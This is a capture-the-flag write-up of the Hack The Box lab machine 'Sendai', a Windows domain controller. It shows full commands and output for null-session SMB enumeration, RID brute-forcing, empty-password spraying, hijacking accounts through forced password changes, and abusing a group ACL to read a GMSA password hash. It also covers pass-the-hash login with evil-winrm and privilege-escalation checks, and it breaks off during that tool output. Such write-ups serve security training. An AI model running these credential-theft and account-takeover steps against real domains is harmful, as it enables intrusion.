---
title: "Sendai — English"
date: 2026-01-10 00:00:00 +0100
categories: [CTF, HTB]
tags: [active-directory, adcs, esc1, esc4, gmsa, password-reset, smb]
lang: en
toc: true
description: >-
  SMB Guest access, password reset, GMSA, and AD CS ESC4-to-ESC1 abuse
  to gain control of the domain.
---

<nav class="language-switcher" aria-label="Article language">
  <a href="{{ '/posts/sendai/' | relative_url }}" lang="it">IT</a>
  <span class="is-current" aria-current="page">EN</span>
</nav>


## 🎯 Executive Summary

**Sendai** is a Windows machine exposing several vulnerabilities common to misconfigured Active Directory environments. Initial access abuses the enabled Guest account to enumerate users and identify an account with `UserMustChangePassword`, enabling account takeover. Lateral movement relies on permissions over a **GMSA** (Group Managed Service Account), while the final escalation abuses an **ESC4** certificate-template misconfiguration to introduce **ESC1** and impersonate **Administrator**.

| Attribute | Value |
|:---------------|:---------------------------------------------------------------------------------------------------------------------------|
| **OS**         | Windows Server 2022
| **Difficulty** | Medium
| **MITRE TTPs** | ![](https://img.shields.io/badge/T1098-Account_Manipulation-red) ![](https://img.shields.io/badge/T1649-ADCS_Abuse-orange) |

> Objective
>
> Use the chain SMB Guest → Password Reset → GMSA → ADCS ESC4 to get Domain Admin.

------------------------------------------------------------------------

## Reconnaissance

### Nmap Scan

The initial scan reveals a Domain Controller (sendai.vl) with standard active services (DNS, Kerberos, LDAP, SMB, WinRM).

```
sudo nmap -p- -A -v -open -T4 10.129.234.66
```

    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Simple DNS Plus
    80/tcp    open  http          Microsoft IIS httpd 10.0
    | http-methods:
    |   Supported Methods: OPTIONS TRACE GET HEAD POST
    |_  Potentially risky methods: TRACE
    |_http-title: IIS Windows Server
    |_http-server-header: Microsoft-IIS/10.0
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-06 09:54:44Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=dc.sendai.vl
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
    | Issuer: commonName=sendai-DC-CA
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2025-08-18T12:30:05
    | Not valid after:  2026-08-18T12:30:05
    | MD5:     879e fbc1 988b 964a e183 6735 66b8 9f3c
    | SHA-1:   099e 0fbb 349b 7fb1 35de 6acb 77a4 c3e5 d0e1 4578
    |_SHA-256: a413 a8ec b9c7 1614 ac1c 0c29 c812 d52e 3e0d 0c4d 4cb8 9d5c 008b f8c3 61fc d1ed
    |_ssl-date: TLS randomness does not represent time
    443/tcp   open  ssl/https?
    | ssl-cert: Subject: commonName=dc.sendai.vl
    | Subject Alternative Name: DNS:dc.sendai.vl
    | Issuer: commonName=dc.sendai.vl
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2023-07-18T12:39:21
    | Not valid after:  2024-07-18T00:00:00
    | MD5:     3223 91f5 f1f7 4e16 738e 382d 053e c7fa
    | SHA-1:   5282 f809 dcc9 8d53 e9a1 065a 25a1 c741 fa2c 4bc5
    |_SHA-256: 8dea da44 e251 b7ce c697 2a88 0610 eed5 0009 40f9 e115 2be7 7614 30b4 4c89 c070
    |_ssl-date: TLS randomness does not represent time
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=dc.sendai.vl
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
    | Issuer: commonName=sendai-DC-CA
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2025-08-18T12:30:05
    | Not valid after:  2026-08-18T12:30:05
    | MD5:     879e fbc1 988b 964a e183 6735 66b8 9f3c
    | SHA-1:   099e 0fbb 349b 7fb1 35de 6acb 77a4 c3e5 d0e1 4578
    |_SHA-256: a413 a8ec b9c7 1614 ac1c 0c29 c812 d52e 3e0d 0c4d 4cb8 9d5c 008b f8c3 61fc d1ed
    |_ssl-date: TLS randomness does not represent time
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=dc.sendai.vl
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
    | Issuer: commonName=sendai-DC-CA
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2025-08-18T12:30:05
    | Not valid after:  2026-08-18T12:30:05
    | MD5:     879e fbc1 988b 964a e183 6735 66b8 9f3c
    | SHA-1:   099e 0fbb 349b 7fb1 35de 6acb 77a4 c3e5 d0e1 4578
    |_SHA-256: a413 a8ec b9c7 1614 ac1c 0c29 c812 d52e 3e0d 0c4d 4cb8 9d5c 008b f8c3 61fc d1ed
    |_ssl-date: TLS randomness does not represent time
    3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
    |_ssl-date: TLS randomness does not represent time
    | ssl-cert: Subject: commonName=dc.sendai.vl
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
    | Issuer: commonName=sendai-DC-CA
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2025-08-18T12:30:05
    | Not valid after:  2026-08-18T12:30:05
    | MD5:     879e fbc1 988b 964a e183 6735 66b8 9f3c
    | SHA-1:   099e 0fbb 349b 7fb1 35de 6acb 77a4 c3e5 d0e1 4578
    |_SHA-256: a413 a8ec b9c7 1614 ac1c 0c29 c812 d52e 3e0d 0c4d 4cb8 9d5c 008b f8c3 61fc d1ed
    3389/tcp  open  ms-wbt-server Microsoft Terminal Services
    | ssl-cert: Subject: commonName=dc.sendai.vl
    | Issuer: commonName=dc.sendai.vl
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2026-01-05T09:05:09
    | Not valid after:  2026-07-07T09:05:09
    | MD5:     c44f cfc8 64d5 4d19 ea3f 3a83 3d5c 3ddc
    | SHA-1:   cc7a 7ba7 75ba 46fd 14b2 fbf5 9bae 2ab2 10f4 8a30
    |_SHA-256: 1bff c0d8 82bb 8e08 a347 10ac 78d3 26c1 ccb8 5f43 bc52 8e58 de87 1508 cba7 f2ff
    |_ssl-date: 2026-01-06T09:56:20+00:00; +1s from scanner time.
    | rdp-ntlm-info:
    |   Target_Name: SENDAI
    |   NetBIOS_Domain_Name: SENDAI
    |   NetBIOS_Computer_Name: DC
    |   DNS_Domain_Name: sendai.vl
    |   DNS_Computer_Name: dc.sendai.vl
    |   DNS_Tree_Name: sendai.vl
    |   Product_Version: 10.0.20348
    |_  System_Time: 2026-01-06T09:55:42+00:00
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    9389/tcp  open  mc-nmf        .NET Message Framing
    49664/tcp open  msrpc         Microsoft Windows RPC
    49667/tcp open  msrpc         Microsoft Windows RPC
    57642/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    57643/tcp open  msrpc         Microsoft Windows RPC
    57658/tcp open  msrpc         Microsoft Windows RPC
    59250/tcp open  msrpc         Microsoft Windows RPC
    59272/tcp open  msrpc         Microsoft Windows RPC
    59344/tcp open  msrpc         Microsoft Windows RPC
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
    OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
    Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
    No exact OS matches for host (test conditions non-ideal).
    Uptime guess: 0.036 days (since Tue Jan  6 10:04:47 2026)
    Network Distance: 2 hops
    TCP Sequence Prediction: Difficulty=256 (Good luck!)
    IP ID Sequence Generation: Incremental
    Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-time:
    |   date: 2026-01-06T09:55:43
    |_  start_date: N/A
    | smb2-security-mode:
    |   3.1.1:
    |_    Message signing enabled and required

### Host and Configuration Detection SMB

The first command is a basic scan to identify the target.

```
nxc smb 10.129.234.66                                    
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
```

NetExec (nxc) identifies the host as a Windows Server 2022 (Build 20348) acting as Domain Controller (name: DC) for domain **sendai.vl**.  
The output shows `Null Auth:True.` This is the first major vulnerability indicator: the server could accept connections without valid credentials.  

------------------------------------------------------------------------

**Confirmation “Null Session” (Accesso Ospite)** Here we explicitly check if nothing (or anonymous) authentication is allowed.

**Syntax:** `-u '%'` indicates an empty/null user and `-p ''` indicates an empty password.

The attack was successful! The server mapped the anonymous request to the Guest account. We have a foot in the network-level system.

```
nxc smb 10.129.234.66 -u '%' -p ''
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\%: (Guest)
```

------------------------------------------------------------------------

**Enumeration of Sharing (Shares)**

Now that we have valid access (such as Guest), lists the shared folders available; several share is listed, but the Permissions column is fundamental.  
We have read access (READ) to three share:

`IPC$:` Standard for null sessions, it serves to enumerate users/groups (RID Cycling).  
`Users:` Very critical. It usually contains user home directories.  
`sendai:` Non-standard share (created by the administrator), probably contains sensitive business data.  

```
nxc smb 10.129.234.66 -u '%' -p '' --shares
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\%: (Guest)
SMB         10.129.234.66   445    DC               [*] Enumerated shares
SMB         10.129.234.66   445    DC               Share           Permissions     Remark
SMB         10.129.234.66   445    DC               -----           -----------     ------
SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.66   445    DC               C$                              Default share
SMB         10.129.234.66   445    DC               config                          
SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.66   445    DC               NETLOGON                        Logon server share 
SMB         10.129.234.66   445    DC               sendai          READ            company share
SMB         10.129.234.66   445    DC               SYSVOL                          Logon server share 
SMB         10.129.234.66   445    DC               Users           READ  
```

------------------------------------------------------------------------

Manual exploration with `smbclient`.

We connect manually to share `Users` to see what is inside.  
**Syntax:** `-N` is for “No password”.  
**Results:** We can list content (`ls`), confirming read access and seeing folders like Default and Public.

```
smbclient //10.129.234.66/Users -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Tue Jul 11 11:58:27 2023
  ..                                DHS        0  Wed Apr 16 04:55:42 2025
  Default                           DHR        0  Tue Jul 11 18:36:32 2023
  desktop.ini                       AHS      174  Sat May  8 10:18:31 2021
  Public                             DR        0  Tue Jul 11 09:36:58 2023
```

------------------------------------------------------------------------

**Spidering Automatic** (Research File)

Instead of manually searching in each folder, we use NetExec with the module `spider_plus` to index all content of legible share.

**Action:** The script scans IPC\$, sendai and Users once again.

**Results:** Save a JSON report containing the list of all found files.

***Note:***  
**Analysis of JSON:** `(jq .)` The final output shows that inside the personalized share sendai was found a file called `incident.txt`. This is likely a file ***“loot”*** that contains clues or passwords to continue the attack.

```
nxc smb 10.129.234.66 -u '%' -p '' -M spider_plus
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\%: (Guest)
SPIDER_PLUS 10.129.234.66   445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.234.66   445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.234.66   445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.234.66   445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.234.66   445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.234.66   445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.234.66   445    DC               [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.129.234.66   445    DC               [*] Enumerated shares
SMB         10.129.234.66   445    DC               Share           Permissions     Remark
SMB         10.129.234.66   445    DC               -----           -----------     ------
SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.66   445    DC               C$                              Default share
SMB         10.129.234.66   445    DC               config
SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.66   445    DC               NETLOGON                        Logon server share
SMB         10.129.234.66   445    DC               sendai          READ            company share
SMB         10.129.234.66   445    DC               SYSVOL                          Logon server share
SMB         10.129.234.66   445    DC               Users           READ
SPIDER_PLUS 10.129.234.66   445    DC               [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.234.66.json".
SPIDER_PLUS 10.129.234.66   445    DC               [*] SMB Shares:           8 (ADMIN$, C$, config, IPC$, NETLOGON, sendai, SYSVOL, Users)
SPIDER_PLUS 10.129.234.66   445    DC               [*] SMB Readable Shares:  3 (IPC$, sendai, Users)
SPIDER_PLUS 10.129.234.66   445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.234.66   445    DC               [*] Total folders found:  68
SPIDER_PLUS 10.129.234.66   445    DC               [*] Total files found:    62
SPIDER_PLUS 10.129.234.66   445    DC               [*] File size average:    58.99 KB
SPIDER_PLUS 10.129.234.66   445    DC               [*] File size min:        3 B
SPIDER_PLUS 10.129.234.66   445    DC               [*] File size max:        2.65 MB
```

```
cat '/home/kali/.nxc/modules/nxc_spider_plus/10.129.234.66.json' | jq .
 
"sendai": {
    "incident.txt": {
      "atime_epoch": "2023-07-18 19:34:15",
      "ctime_epoch": "2023-07-18 19:30:59",
      "mtime_epoch": "2023-07-18 19:34:15",
      "size": "1.34 KB"
```

![100%](/assets/img/posts/sendai/incident.png)

At this stage we have identified that Domain Controller **DC.sendai.vl** allows `Null Session`. Taking advantage of this access, we enumerated network share by finding that folders `Users` and `sendai` are accessible by anyone. Through the spidering, we have identified an interesting file (`incident.txt`) share sendai which deserves immediate inspection.

------------------------------------------------------------------------

### User Enumeration (RID Cycling)

Having confirmed access via Null Session (or Guest), we can question Domain Controller to list domain users. Since we do not have permission to make a complete LDAP dump, we use the technique of `RID Cycling` (RID Brute Force).

This technique interrogates the Local Security Authority (LSA) trying to map RIDs (Relative IDs) to user names.

```
# Run RID brute force and clean the output to create a wordlist
netexec smb dc.sendai.vl -u nothing -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 > users.txt
```

The command generates a clean list of valid users saved in users.txt, which includes service accounts (sqlsvc, websvc) and standard users (Thomas.Powell, Elliot.Yates).

**Password Spraying & Account Status Analysis**

With the list of valid users, we perform targeted control. We try to authenticate on each account using an empty password (`-p ''`). This test is used to identify accounts with unset passwords or incorrect configurations.

```
nxc smb DC.sendai.vl -u users.txt -p '' --continue-on-success
 
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [-] sendai.vl\Administrator: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\Guest: 
SMB         10.129.234.66   445    DC               [-] sendai.vl\krbtgt: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\DC$: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\sqlsvc: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\websvc: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Dorothy.Jones: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kerry.Robinson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Naomi.Gardner: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Anthony.Smith: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Susan.Harper: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Stephen.Simpson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Marie.Gallagher: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kathleen.Kelly: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Norman.Baxter: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Jason.Brady: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Elliot.Yates: `STATUS_PASSWORD_MUST_CHANGE` 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Malcolm.Smith: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lisa.Williams: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Ross.Sullivan: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Clifford.Davey: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Declan.Jenkins: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lawrence.Grant: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Leslie.Johnson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Megan.Edwards: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell: `STATUS_PASSWORD_MUST_CHANGE`
SMB         10.129.234.66   445    DC               [-] sendai.vl\mgtsvc$: STATUS_LOGON_FAILURE
```

**Results analysis:** The output reveals critical information about the status of accounts:

`STATUS_LOGON_FAILURE:` Most accounts are password protected (e.g. Administrator, sqlsvc).  
`[+] Guest:` Confirm that the Guest account is active and accessible without password.  
`STATUS_PASSWORD_MUST_CHANGE:` This is the most important result. Users Elliot.Yates and Thomas.Powell They return this state.

> The state `STATUS_PASSWORD_MUST_CHANGE` indicates that these accounts have a configured password (often empty or temporary) that has expired or requires immediate change to the next access.
>
> The Protocol SMB allows you to make this password change remotely without knowing the old password (if it is empty) or providing it if you notice. This is our attack carrier to get a valid account.

------------------------------------------------------------------------

### Exploitation: Force Password Change

Having identified that user Thomas.Powell has the flag **STATUS_PASSWORD_MUST_CHANGE**, we use the form `change-password` of NetExec to set up a new password and take account control.

***Attempt 1:*** `Policy failure`

Initially, we try to set a simple password (“nothing”).

```
nxc smb DC.sendai.vl -u Thomas.Powell -p '' -M change-password -o NEWPASS=nothing
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE 
CHANGE-P... 10.129.234.66   445    DC               [-] SMB-SAMR password change failed: SAMR SessionError: code: 0xc000006c - STATUS_PASSWORD_RESTRICTION - When trying to update a password, this status indicates that some password update rule has been violated. For example, the password may not meet length criteria.
```

The attempt fails with the error `STATUS_PASSWORD_RESTRICTION (Code: 0xc000006c)`.

> `Password Policy Violation` This error does not indicate insufficient permissions, but that the password chosen does not respect the security criteria of the domain (minimum length, complexity, history, etc.).

***Attempt 2:*** `Success`

Try again with a more complex password that includes letters, numbers and special characters (“nothing123!”).

```
nxc smb DC.sendai.vl -u Thomas.Powell -p '' -M change-password -o NEWPASS=nothing123!
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE 
CHANGE-P... 10.129.234.66   445    DC               [+] Successfully changed password for Thomas.Powell
```

**Results:** `[+] Successfully changed password for Thomas.Powell`. The operation was successful. Now we have valid credentials for the domain.

**Veification & Policy Enumeration**

To confirm access and understand why the first attempt has failed (useful for future lateral movements), we authenticate with the new password and discard the domain password policy.

```
nxc smb DC.sendai.vl -u Thomas.Powell -p 'nothing123!' --pass-pol
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Thomas.Powell:nothing123! 
SMB         10.129.234.66   445    DC               [+] Dumping password info for domain: SENDAI
SMB         10.129.234.66   445    DC               Minimum password length: 7
SMB         10.129.234.66   445    DC               Password history length: 24
SMB         10.129.234.66   445    DC               Maximum password age: 41 days 23 hours 53 minutes 
SMB         10.129.234.66   445    DC               
SMB         10.129.234.66   445    DC               Password Complexity Flags: 000001
SMB         10.129.234.66   445    DC                   Domain Refuse Password Change: 0
SMB         10.129.234.66   445    DC                   Domain Password Store Cleartext: 0
SMB         10.129.234.66   445    DC                   Domain Password Lockout Admins: 0
SMB         10.129.234.66   445    DC                   Domain Password No Clear Change: 0
SMB         10.129.234.66   445    DC                   Domain Password No Anon Change: 0
SMB         10.129.234.66   445    DC                   Domain Password Complex: 1
SMB         10.129.234.66   445    DC               
SMB         10.129.234.66   445    DC               Minimum password age: 1 day 4 minutes 
SMB         10.129.234.66   445    DC               Reset Account Lockout Counter: 10 minutes 
SMB         10.129.234.66   445    DC               Locked Account Duration: 10 minutes 
SMB         10.129.234.66   445    DC               Account Lockout Threshold: None
SMB         10.129.234.66   445    DC               Forced Log off Time: Not Set
```

**Policy analysis:** The output confirms access (`[+]`) and gives us the rules of the game:

`Minimum password length: 7:` The length of the first attempt (“nothing”, 7 characters) was sufficient. `Password Complexity Flags: 1:` The complexity is enabled. This explains the failure of the first attempt (no numbers/symbols).  
`Account Lockout Threshold: None:` Critical. There is no account block for too many failed attempts. This allows us to perform aggressive Brute Force on other users in the future if necessary.

------------------------------------------------------------------------

### BloodHound Enumeration

With valid credentials `Thomas.Powell`, we collect domain data to identify attack paths.

```
bloodhound-ce-python -c All -d sendai.vl -u 'Thomas.Powell' -p 'nothing123!' -dc dc.sendai.vl -ns 10.129.234.66 --zip
```

From the graph analysis, an interesting path involving the GMSA (Group Managed Service Accounts):

`Thomas.Powell` is a member of the Support group. The group `Support` has allowed `GenericAll` on the group `AdmSvc`. The group `AdmSvc` has the privilege `ReadGMSAPassword` on the user `mgtsvc$`. `mgtsvc$` is a member of `Remote Management Users`, so it can access via **WinRM**.

![100%](/assets/img/posts/sendai/bloodhound.png)

------------------------------------------------------------------------

### Lateral Movement: GMSA Abuse

The goal is to read the password of the managed service account (mgtsvc\$). To do so, we must first rise by entering the group AdmSvc.

1.  **Abuse ACL (AddMember)**

Since our user (via Support group) has GenericAll up AdmSvc, we can add ourselves to that group using bloodyAD.

```
bloodyAD --host DC.sendai.vl -d sendai.vl -u 'Thomas.Powell' -p 'nothing123!' add groupMember 'AdmSvc' 'Thomas.Powell'
 
Output: [+] Thomas.Powell added to AdmSvc
```

2.  **Password Recovery GMSA**

Now that we are members of `AdmSvc`, we can read the `msDS-ManagedPassword` attribute of the **mgtsvc$** account. We use NetExec to extract its NTLM hash directly.

```
netexec ldap DC.sendai.vl -u 'Thomas.Powell' -p 'nothing123!' --gmsa
 
Output:
 
LDAP ... [*] Getting GMSA Passwords
LDAP ... Account: mgtsvc$  NTLM: 2579ff83767013c18bbec6e84ffea6f9
```

> **What is a GMSA?** I `Group Managed Service Accounts` are domain accounts managed automatically by AD (*the password changes by itself and is very complex*). However, if an attacker gets permission to read it, he can indefinitely impersonate the account until the password rotates (usually every 30 days).

3.  **Access WinRM & User Flag** 🚩

With the recovered NTLM hash, we can authenticate via Pass-The-Hash and get the user flag.

```
evil-winrm -i dc.sendai.vl -u 'mgtsvc$' -H '2579ff83767013c18bbec6e84ffea6f9'
 
PowerShell
 
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> type ..\Desktop\user.txt
```

## Initial Access and Enumeration

Once inside, I ran routine checks:

`whoami /priv:` Show active privileges. Although `SeMachineAccountPrivilege` be enabled, there are no classic privileges from “immediate admin” (as `SeImpersonate` or `SeDebug`).

`whoami /all:` Reveal that the user belongs to the Domain Computers group.

**Automated enumeration with PrivescCheck**

To speed up the search for misconfigurations, I uploaded the script in memory PowerShell `PrivescCheck` (***Import-Module .\PrivescCheck.ps1***) and I ran it with `Invoke-PrivescCheck`.

This tool analyses various aspects of the system, including:

- User identity and groups (which confirm the Medium integrity level).
- Privilegi (no exploitable directly).
- Non-default services: Here is the critical discovery.

**Cleartext Credentials in Services**

The output of the script in the “Service list” section highlights an abnormal service called Support.

Analyzing the configuration of the service, we notice a very serious security vulnerability:

```
*Evil-WinRM* PS C:\Users\mgtsvc$\documents> .\PrivescCheck.ps1                                                               
*Evil-WinRM* PS C:\Users\mgtsvc$\documents> Import-Module .\PrivescCheck.ps1                                                 
*Evil-WinRM* PS C:\Users\mgtsvc$\documents> Invoke-PrivescCheck                                                                            
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓                                                                           
┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃                                                                           
┃ NAME     ┃ User identity                                     ┃
┃ TYPE     ┃ Base                                              ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Get information about the current user (name, domain name)   ┃
┃ and its access token (SID, integrity level, authentication   ┃
┃ ID).                                                         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 
Name             : SENDAI\mgtsvc$                   
SID              : S-1-5-21-3085872742-570972823-736764132-1130                                         
IntegrityLevel   : Medium Plus Mandatory Level (S-1-16-8448)                                            
SessionId        : 0                                
TokenId          : 00000000-00c8e314                
AuthenticationId : 00000000-00c7132b                
OriginId         : 00000000-00000000                
ModifiedId       : 00000000-00c71332                
Source           : NtLmSsp (00000000-00000000)                                                          
 
 
 
[*] Status: Informational - Severity: None - Execution time: 00:00:00.377                                                    
 
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓                                                             
┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃                                                             
┃ NAME     ┃ User groups                                       ┃                                                             
┃ TYPE     ┃ Base                                              ┃                                        
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫                                        
┃ Get information about the groups the current user belongs to ┃                                        
┃ (name, type, SID).                                           ┃                                        
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛                                        
 
Name                                        Type           SID                                          
----                                        ----           ---                                          
SENDAI\Domain Computers                     Group          S-1-5-21-3085872742-570972823-736764132-515
Everyone                                    WellKnownGroup S-1-1-0                                      
BUILTIN\Remote Management Users             Alias          S-1-5-32-580                                 
BUILTIN\Pre-Windows 2000 Compatible Access  Alias          S-1-5-32-554                                 
BUILTIN\Users                               Alias          S-1-5-32-545                                 
BUILTIN\Certificate Service DCOM Access     Alias          S-1-5-32-574                                 
NT AUTHORITY\NETWORK                        WellKnownGroup S-1-5-2                                      
NT AUTHORITY\Authenticated Users            WellKnownGroup S-1-5-11                                     
NT AUTHORITY\This Organization              WellKnownGroup S-1-5-15                                     
NT AUTHORITY\NTLM Authentication            WellKnownGroup S-1-5-64-10                                  
Mandatory Label\Medium Plus Mandatory Level Label          S-1-16-8448                                  
 
 
[*] Status: Informational - Severity: None - Execution time: 00:00:00.119                               
 
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓                                        
┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃                                        
┃ NAME     ┃ User privileges                                   ┃                                        
┃ TYPE     ┃ Base                                              ┃                                        
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫                                        
┃ Check whether the current user is granted privileges that    ┃                                        
┃ can be leveraged for local privilege escalation.             ┃                                        
